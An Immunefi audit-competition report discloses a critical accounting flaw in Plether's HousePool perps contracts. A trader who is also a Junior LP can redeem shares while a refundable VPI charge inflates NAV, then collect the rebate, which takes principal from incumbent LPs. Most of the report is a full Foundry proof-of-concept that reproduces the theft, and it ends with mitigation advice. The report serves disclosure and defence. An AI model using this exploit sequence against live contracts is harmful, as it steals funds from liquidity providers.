# \#99163 [SC-Critical] Refundable VPI charge in Junior redemption NAV lets a trader-LP withdraw incumbent principal

**Submitted on Nov 12th 2026 at 08:44:34 UTC by @Psyone for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99163
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief / Intro

A trader who also owns Junior LP shares can open a skew-increasing position, cause its refundable VPI charge to be counted as pool revenue, redeem Junior shares against that increased NAV, and then close the position to receive the charge back as a rebate. The rebate is paid after the attacker has exited, reducing the USDG paid to continuing Junior LPs. A pinned-source Foundry PoC shows an ordinary LP receiving less than their deposited principal for the same shares while the attacker ends with more USDG than they supplied.

## Vulnerability Details

The fault is the timing of ownership recognition for a refundable opening charge. On an open, `CfdEngineSettlementSidecar` collects positive VPI into HousePool and records the cash as claimant revenue (`packages/perps/src/CfdEngineSettlementSidecar.sol:446-463`). The position retains positive lifetime `vpiAccrued`. A subsequent skew-reducing close may pay an action rebate, bounded by that accrued VPI, from HousePool (`CfdEngineSettlementSidecar.sol:608-624`).

During the intervening LP epoch, `CfdEngineProtocolLens.getHousePoolInputSnapshot` passes HousePool's physical cash and terminal marked price delta to the pool (`CfdEngineProtocolLens.sol:62-74`). `HousePoolAccountingLib.buildReconcileSnapshot` deducts trader claims and marked price liabilities, but no liability for the refundable opening VPI (`HousePoolAccountingLib.sol:63-77`). `HousePool` reconciles the charge into Junior principal and uses that principal to price and fund a matured Junior share redemption (`HousePool.sol:843-905`). The trader-LP can therefore receive a share of cash that the system later refunds to the same trader account. The close rebate then falls on LPs who remain.

The attack requires an ordinary liquid market state, no trusted-role misconduct, and no oracle price manipulation. The reproducible sequence is:

1. Fund a 20,000,000 USDG pool with release parameters and ordinary LP deposits. The attacker owns 9,500,000 USDG of Junior shares and independently funds a trader account with 1,000,000 USDG; an unrelated LP owns 9,499,999 USDG of ordinary Junior shares.
2. Open an 8,000,000-notional Long through public `OrderRouter.commitOrder` and `executeOrder`. At the release 1% VPI factor and a neutral six-feed basket with 1-bp confidence, the position accrues 15,999.201609 USDG of positive VPI. HousePool's actual USDG balance rises by exactly that amount.
3. After cooldown, request redemption of all attacker Junior shares. Public `OrderRouter.settleLpEpoch` prices and fully funds the request while the Long is still open. The attacker claims 9,508,090.272190 USDG.
4. Close the Long through the public Router at the same neutral basket mark. `ActionRebateSettled` records 12,799.121769 USDG assessed and paid, with zero waived. Withdraw the remaining trader custody.
5. The unrelated Junior LP redeems one tenth of the shares minted by their ordinary deposit. The proportional deposited principal for those shares is 949,999.899999 USDG, but the actual funded claim is 949,550.378974 USDG.

A matched control opens and closes the same Long, submits the same LP redemption request, and settles the same LP epoch at the same terminal mark, but closes the Long immediately before redemption pricing. It pays the unrelated LP 950,179.299998 USDG for identical shares. The attack therefore reduces that paid claim by 628.921024 USDG; 449.521025 USDG of the attacked claim is below deposited principal. All tested redemption shares are funded and claimed, with no unpaid assets.

The attacker receives 9,508,090.272190 USDG from the LP claim and 993,168.288271 USDG after withdrawing trader custody. Against 10,500,000 USDG supplied, the token net is **+1,258.560461 USDG**, including the modeled trade charges and carry but excluding chain gas and capital financing. The matched control's token net is **−5,030.650443 USDG**. These amounts are overlapping views of the same transfer and must not be summed with the victim loss.

## Impact Details

The demonstrated impact matches the in-scope Critical category of direct theft of user funds other than unclaimed yield: an unrelated Junior LP receives 449.521025 USDG less than the proportional principal deposited for the shares they actually redeem. The matched control preserves that principal. The attacker is token-profitable in the same run. This is a paid USDG shortfall, not only a changed preview value or unrealized accounting number.

The witness uses the pinned release configuration: 1% VPI factor, 40% maximum skew ratio, 4-bp execution fee, 25-bp settlement buffer, 8% Senior coupon, 40M USDG Senior cap and 80% share cap, 1 USDG permanent seed in each tranche, and the 2,500-bp adverse-confidence multiplier. Six MockPyth feeds have nonzero confidence. Sensitivity runs with otherwise identical public paths leave attacker token profit positive at 1–5 bps per-feed confidence, from +1,258.560461 USDG at 1 bp to +56.363429 USDG at 5 bps; at 6 bps the modeled token net is negative. The PoC does not establish that an authentic simultaneous signed six-feed basket in that profitable range was available at a specific time, nor does it price gas, external hedging, financing, or FX movement during the LP epoch delay. It proves the contract path under the source competition's permitted local Pyth mock.

## Mitigation

Keep refundable positive VPI separate from earned Junior ownership revenue while the position can claim a close rebate. A durable repair should track the unvested amount through increases, partial closes, full closes and liquidations; use the same ownership basis for LP entries and exits; pay any rebate from its backing; and release only the final nonrefundable remainder to Junior revenue. The LP withdrawal budget must still protect physical cash and existing trader claims. Simply capping the close rebate by lifetime VPI is insufficient: the PoC stays within that cap. Simply increasing the withdrawal cash reserve by the opening charge is also insufficient when the redemption remains fundable, because its share price has already credited that charge. A fix should include a regression test that compares the same trade with a Junior redemption immediately before and after close, asserting that no attacker profit is created by the timing and that an incumbent's paid principal is preserved.

## References

- Pinned source: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- Opening charge and close rebate: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L442-L463 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L608-L624
- NAV calculation: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L63-L77
- Release parameters: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md
- Public prior AI-scan item: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L1742-L1808 . That item concerns an enlarged close rebate caused by reduced depth. Here the LP payout differs by 6,278.005173 USDG between attack and control, while the trader cash differs by 11.205731 USDG; the primary transfer occurs through redemption NAV.
- Plether's published accounting description: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L862-L872 . It describes broad VPI/NAV treatment but does not identify this positive-charge cash-out and paid principal loss. I recognize that Immunefi may assess the root-cause relationship differently.

## Proof of Concept

## Proof of Concept

At commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, use the repository's Foundry test suite. Save the following complete source as `packages/perps/test/HuntVpiChargeExit79.t.sol`, then run from the repository root:

```sh
forge test --root packages/perps --match-path test/HuntVpiChargeExit79.t.sol -vv --jobs 1
```

Expected outcome: `test_ReleaseParamPublicRouteAttackVsMatchedControl` and `test_ConfidenceSensitivity` pass. The first asserts actual USDG claims, attacker profit, an incumbent's principal shortfall, the matched control, complete redemption funding, opening VPI cash arrival and the paid close rebate. The second repeats the public path across nonzero confidence levels.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";

contract HuntVpiChargeExit79 is BasePerpTest {

    address constant VICTIM_LP = address(0x1001);
    address constant SENIOR_LP = address(0x1002);
    address constant JUNIOR_SEED_LP = address(0x1006);
    address constant ATTACKER_LP = address(0x1004);
    address constant ATTACKER_TRADER = address(0x1005);

    uint256 constant LONG_SIZE = 8_000_000e18;
    uint256 constant DEPOSIT = 9_500_000e6;
    uint256 constant TRADER_CAPITAL = 1_000_000e6;
    uint256 constant VICTIM_ORDINARY = 9_499_999e6;
    uint256 constant SENIOR_ORDINARY = 999_999e6;
    uint256 internal victimOrdinaryShares;
    uint256 internal attackerOrdinaryShares;
    uint256 internal confidenceBps;
    bytes32[] internal sixFeedIds;

    struct Outcome {
        uint256 redeemed;
        uint256 traderEnding;
        uint256 victimRedeemed;
        uint256 victimShares;
        uint256 lpSettleTime;
        uint256 terminalMark;
        uint256 poolAfterOpen;
        uint256 poolAfterClose;
        uint256 juniorAfterClose;
        uint256 maxAttackerShares;
        uint256 openVpi;
        uint256 closeRebateAssessed;
        uint256 closeRebatePaid;
        uint256 closeRebateWaived;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _juniorSeedReceiver() internal pure override returns (address) {
        return JUNIOR_SEED_LP;
    }

    function _seniorSeedReceiver() internal pure override returns (address) {
        return SENIOR_LP;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(engine.executionFeeBps(), 4);
        assertEq(engine.settlementBufferBps(), 25);
        _warpToLiveMarket();
        _rotateToSixFeedOracle();
        IOrderRouterAdminHost.RouterConfig memory releaseRouterConfig = _routerConfig();
        releaseRouterConfig.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(releaseRouterConfig);
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500, "release adverse confidence multiplier");
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10, "release confidence gate");
        _warpToLiveMarket();
        _setLiveSix(1e8, vm.getBlockTimestamp());
        router.updateMarkPrice(_emptyUpdate());
        assertApproxEqAbs(engine.lastMarkPrice(), 1e8, 100);

        victimOrdinaryShares = _depositJunior(VICTIM_LP, VICTIM_ORDINARY);
        _depositSenior(SENIOR_LP, SENIOR_ORDINARY);
        attackerOrdinaryShares = _depositJunior(ATTACKER_LP, DEPOSIT);
        assertEq(pool.seniorRateBps(), 800, "release senior coupon");
        _fundTrader(ATTACKER_TRADER, TRADER_CAPITAL);
        assertEq(pool.totalAssets(), 20_000_000e6, "source state: 20m pool");
    }

    function test_ReleaseParamPublicRouteAttackVsMatchedControl() public {
        confidenceBps = 1;
        uint256 snap = vm.snapshotState();
        Outcome memory attack = _run(true);
        assertTrue(vm.revertToState(snap));
        Outcome memory control = _run(false);

        int256 attackPnl = int256(attack.redeemed + attack.traderEnding) - int256(DEPOSIT + TRADER_CAPITAL);
        int256 controlPnl = int256(control.redeemed + control.traderEnding) - int256(DEPOSIT + TRADER_CAPITAL);
        uint256 victimBasis = (VICTIM_ORDINARY * attack.victimShares) / victimOrdinaryShares;
        console2.log("attack redeemed atoms", attack.redeemed);
        console2.log("control redeemed atoms", control.redeemed);
        console2.log("attack trader ending atoms", attack.traderEnding);
        console2.log("control trader ending atoms", control.traderEnding);
        console2.log("attack victim claim atoms", attack.victimRedeemed);
        console2.log("control victim claim atoms", control.victimRedeemed);
        console2.log("attack junior after close atoms", attack.juniorAfterClose);
        console2.log("control junior after close atoms", control.juniorAfterClose);
        console2.log("attacker shares", attack.maxAttackerShares);
        console2.log("opening VPI atoms", attack.openVpi);
        console2.log("opening cash increase atoms", attack.poolAfterOpen - 20_000_000e6);
        console2.log("attack close rebate paid atoms", attack.closeRebatePaid);
        console2.log("control close rebate paid atoms", control.closeRebatePaid);
        console2.log("victim shares", attack.victimShares);
        console2.log("victim exact proportional principal atoms", victimBasis);
        console2.logInt(attackPnl);
        console2.logInt(controlPnl);
        assertEq(attack.maxAttackerShares, control.maxAttackerShares, "matched initial LP shares");
        assertEq(attack.openVpi, control.openVpi, "same opening VPI charge");
        assertEq(attack.victimShares, control.victimShares, "matched incumbent shares");
        assertEq(attack.lpSettleTime, control.lpSettleTime, "same withdrawal epoch");
        assertEq(attack.terminalMark, control.terminalMark, "same mark");
        assertGt(attack.poolAfterOpen, 20_000_000e6, "opening charge reaches pool");
        assertGe(attack.poolAfterOpen - 20_000_000e6, attack.openVpi, "opening VPI enters pool cash");
        assertGt(attack.closeRebatePaid, 0, "close pays an actual action rebate");
        assertEq(attack.closeRebateAssessed, attack.closeRebatePaid, "full rebate paid");
        assertEq(attack.closeRebateWaived, 0, "no rebate waived");
        assertGt(attack.redeemed, control.redeemed, "cash-out obtains part of refundable charge");
        assertGt(attackPnl, controlPnl, "attacker improves on same-trade control");
        assertGt(attackPnl, 0, "attack is positive after trader costs");
        assertLt(attack.victimRedeemed, control.victimRedeemed, "incumbent receives less cash");
        assertLt(attack.victimRedeemed, victimBasis, "incumbent loses deposited principal");
        assertGt(control.victimRedeemed, victimBasis, "control preserves deposited principal");
    }

    function test_ConfidenceSensitivity() public {
        uint256[7] memory ratios = [uint256(1), 2, 3, 4, 5, 6, 9];
        for (uint256 i; i < ratios.length; ++i) {
            uint256 snap = vm.snapshotState();
            confidenceBps = ratios[i];
            Outcome memory attack = _run(true);
            int256 pnl = int256(attack.redeemed + attack.traderEnding) - int256(DEPOSIT + TRADER_CAPITAL);
            uint256 victimBasis = (VICTIM_ORDINARY * attack.victimShares) / victimOrdinaryShares;
            console2.log("confidence bps", ratios[i]);
            console2.log("victim funded claim atoms", attack.victimRedeemed);
            console2.logInt(pnl);
            if (ratios[i] == 1) {
                assertGt(pnl, 0, "one-bps signed updates remain profitable");
                assertLt(attack.victimRedeemed, victimBasis, "one-bps victim principal loss");
            }
            assertTrue(vm.revertToState(snap));
        }
    }

    function _depositJunior(
        address actor,
        uint256 assets
    ) internal returns (uint256 shares) {
        settlementToken.mint(actor, assets);
        vm.startPrank(actor);
        settlementToken.approve(address(juniorVault), assets);
        uint256 id = juniorVault.requestDeposit(assets, actor, actor);
        vm.stopPrank();
        _warpToEpoch(id);
        _publicSettleLpEpoch();
        vm.prank(actor);
        shares = juniorVault.claimDeposit(id, assets, actor, actor);
    }

    function _depositSenior(
        address actor,
        uint256 assets
    ) internal returns (uint256 shares) {
        settlementToken.mint(actor, assets);
        vm.startPrank(actor);
        settlementToken.approve(address(seniorVault), assets);
        uint256 id = seniorVault.requestDeposit(assets, actor, actor);
        vm.stopPrank();
        _warpToEpoch(id);
        _publicSettleLpEpoch();
        vm.prank(actor);
        shares = seniorVault.claimDeposit(id, assets, actor, actor);
    }

    function _run(
        bool redeemBeforeClose
    ) internal returns (Outcome memory result) {
        _route(ATTACKER_TRADER, CfdTypes.Side.LONG, LONG_SIZE, 500_000e6, false);
        result.poolAfterOpen = settlementToken.balanceOf(address(pool));
        (,,,,,, int256 openingAccrued) = engine.positions(ATTACKER_TRADER);
        assertGt(openingAccrued, 0, "the trader pays VPI on open");
        result.openVpi = uint256(openingAccrued);
        uint256 unlock = juniorVault.lastDepositTime(ATTACKER_LP) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < unlock) {
            vm.warp(unlock);
        }
        uint256 shares = attackerOrdinaryShares;
        assertEq(juniorVault.maxRequestRedeem(ATTACKER_LP), shares, "ordinary shares are redeemable");
        result.maxAttackerShares = shares;
        assertGt(shares, 0, "attacker LP shares redeemable");
        vm.prank(ATTACKER_LP);
        uint256 redeemId = juniorVault.requestRedeem(shares, ATTACKER_LP, ATTACKER_LP);
        uint256 settleAt = pool.lpEpochStart(redeemId);
        if (!redeemBeforeClose) {
            vm.warp(settleAt - 2);
            (result.closeRebateAssessed, result.closeRebatePaid, result.closeRebateWaived) = _closeAndRecordRebate();
        }
        vm.warp(settleAt);
        _publicSettleLpEpoch();
        result.lpSettleTime = vm.getBlockTimestamp();
        assertEq(juniorVault.claimableRedeemRequest(redeemId, ATTACKER_LP), shares);
        vm.prank(ATTACKER_LP);
        result.redeemed = juniorVault.claimRedeem(redeemId, shares, ATTACKER_LP, ATTACKER_LP);
        assertEq(result.redeemed, settlementToken.balanceOf(ATTACKER_LP));
        assertEq(juniorVault.pendingRedeemRequest(redeemId, ATTACKER_LP), 0, "no pending shares");
        assertEq(juniorVault.claimableRedeemRequest(redeemId, ATTACKER_LP), 0, "no unpaid shares");
        assertEq(juniorVault.claimableRedeemAssets(redeemId, ATTACKER_LP), 0, "no unpaid assets");
        if (redeemBeforeClose) {
            (result.closeRebateAssessed, result.closeRebatePaid, result.closeRebateWaived) = _closeAndRecordRebate();
        } else {
            _neutralTick();
        }
        result.poolAfterClose = settlementToken.balanceOf(address(pool));
        result.juniorAfterClose = pool.juniorPrincipal();
        result.terminalMark = engine.lastMarkPrice();
        uint256 traderAssets = clearinghouse.balanceAssets(ATTACKER_TRADER);
        vm.prank(ATTACKER_TRADER);
        clearinghouse.withdraw(ATTACKER_TRADER, traderAssets);
        result.traderEnding = settlementToken.balanceOf(ATTACKER_TRADER);

        uint256 victimShares = victimOrdinaryShares / 10;
        assertGe(juniorVault.maxRequestRedeem(VICTIM_LP), victimShares, "ordinary victim shares redeemable");
        result.victimShares = victimShares;
        assertGt(victimShares, 0, "incumbent ordinary shares redeemable");
        vm.prank(VICTIM_LP);
        uint256 victimId = juniorVault.requestRedeem(victimShares, VICTIM_LP, VICTIM_LP);
        _warpToEpoch(victimId);
        _publicSettleLpEpoch();
        assertEq(juniorVault.claimableRedeemRequest(victimId, VICTIM_LP), victimShares);
        vm.prank(VICTIM_LP);
        result.victimRedeemed = juniorVault.claimRedeem(victimId, victimShares, VICTIM_LP, VICTIM_LP);
        assertEq(result.victimRedeemed, settlementToken.balanceOf(VICTIM_LP), "victim receives actual USDG");
        assertEq(juniorVault.pendingRedeemRequest(victimId, VICTIM_LP), 0, "victim no pending shares");
        assertEq(juniorVault.claimableRedeemAssets(victimId, VICTIM_LP), 0, "victim no unpaid assets");
    }

    function _warpToEpoch(
        uint256 id
    ) internal {
        uint256 at = pool.lpEpochStart(id);
        if (vm.getBlockTimestamp() < at) {
            vm.warp(at);
        }
    }

    function _closeAndRecordRebate() internal returns (uint256 assessed, uint256 paid, uint256 waived) {
        vm.recordLogs();
        _route(ATTACKER_TRADER, CfdTypes.Side.LONG, LONG_SIZE, 0, true);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 topic = keccak256("ActionRebateSettled(address,uint256,uint256,uint256)");
        uint256 count;
        for (uint256 i; i < entries.length; ++i) {
            if (entries[i].topics.length >= 2 && entries[i].topics[0] == topic) {
                assertEq(address(uint160(uint256(entries[i].topics[1]))), ATTACKER_TRADER);
                (assessed, paid, waived) = abi.decode(entries[i].data, (uint256, uint256, uint256));
                ++count;
            }
        }
        assertEq(count, 1, "exactly one settled close action rebate");
    }

    function _publicSettleLpEpoch() internal {
        uint256 tick = vm.getBlockTimestamp();
        _setUniqueSix(1e8, tick, tick - 1);
        _setLiveSix(1e8, tick);
        router.settleLpEpoch(_emptyUpdate());
        assertApproxEqAbs(engine.lastMarkPrice(), 1e8, 100);
    }

    function _rotateToSixFeedOracle() internal {
        bytes32[] memory ids = new bytes32[](6);
        uint256[] memory weights = new uint256[](6);
        uint256[] memory bases = new uint256[](6);
        bool[] memory inversions = new bool[](6);
        ids[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        ids[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        ids[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        ids[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        ids[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        ids[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
        bases[0] = 117_500_000;
        bases[1] = 638_000;
        bases[2] = 134_480_000;
        bases[3] = 72_880_000;
        bases[4] = 10_860_000;
        bases[5] = 126_100_000;
        inversions[1] = true;
        inversions[3] = true;
        inversions[4] = true;
        inversions[5] = true;
        for (uint256 i; i < 6; ++i) {
            sixFeedIds.push(ids[i]);
        }

        PletherOracle sixFeedOracle =
            new PletherOracle(address(engine), address(pool), address(baseMockPyth), ids, weights, bases, inversions);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig({pletherOracle: address(sixFeedOracle)}));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        pletherOracle = sixFeedOracle;
    }

    function _emptyUpdate() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = "";
    }

    function _rawSix(
        uint256 index,
        uint256 basketPrice
    ) internal pure returns (int64 raw) {
        uint256[6] memory bases = [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];
        uint256 normalized = bases[index] * basketPrice / 1e8;
        uint256 value = index == 1 || index >= 3 ? (1e16 + normalized / 2) / normalized : normalized;
        require(value > 0 && value <= uint256(uint64(type(int64).max)), "positive signed Pyth price");
        raw = int64(uint64(value));
    }

    function _setLiveSix(
        uint256 basketPrice,
        uint256 publishTime
    ) internal {
        for (uint256 i; i < 6; ++i) {
            int64 raw = _rawSix(i, basketPrice);
            uint64 confidence = uint64(uint256(uint64(raw)) * confidenceBps / 10_000);
            baseMockPyth.setPrice(sixFeedIds[i], raw, confidence, -8, publishTime);
        }
    }

    function _setUniqueSix(
        uint256 basketPrice,
        uint256 publishTime,
        uint256 previousTime
    ) internal {
        for (uint256 i; i < 6; ++i) {
            int64 raw = _rawSix(i, basketPrice);
            uint64 confidence = uint64(uint256(uint64(raw)) * confidenceBps / 10_000);
            baseMockPyth.setUniquePrice(sixFeedIds[i], raw, confidence, -8, publishTime, previousTime);
        }
    }

    function _route(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        uint256 nowTs = vm.getBlockTimestamp();
        uint256 target = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: target,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(nowTs + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        uint64 orderId = router.commitOrder(request);
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(orderId);
        uint256 tick = uint256(pending.commitTime) + 1;
        vm.warp(tick);
        vm.roll(vm.getBlockNumber() + 1);
        _setUniqueSix(1e8, tick, tick - 2);
        _setLiveSix(1e8, tick);
        OrderV3Types.ExecutionResult memory outcome = router.executeOrder(orderId, _emptyUpdate());
        assertEq(uint8(outcome.status), uint8(OrderV3Types.LifecycleStatus.Executed), "Router execution must fill");
        assertApproxEqAbs(engine.lastMarkPrice(), 1e8, 100);
    }

    function _neutralTick() internal {
        uint256 tick = vm.getBlockTimestamp() + 1;
        vm.warp(tick);
        vm.roll(vm.getBlockNumber() + 1);
        _setUniqueSix(1e8, tick, tick - 2);
        _setLiveSix(1e8, tick);
        router.updateMarkPrice(_emptyUpdate());
        assertApproxEqAbs(engine.lastMarkPrice(), 1e8, 100);
    }

    function _warpToLiveMarket() internal {
        for (uint256 i; i < 168 && (engine.isOracleFrozen() || engine.isFadWindow()); ++i) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
        }
        assertFalse(engine.isOracleFrozen(), "market must be live");
        assertFalse(engine.isFadWindow(), "market must not be in FAD");
    }

}
```
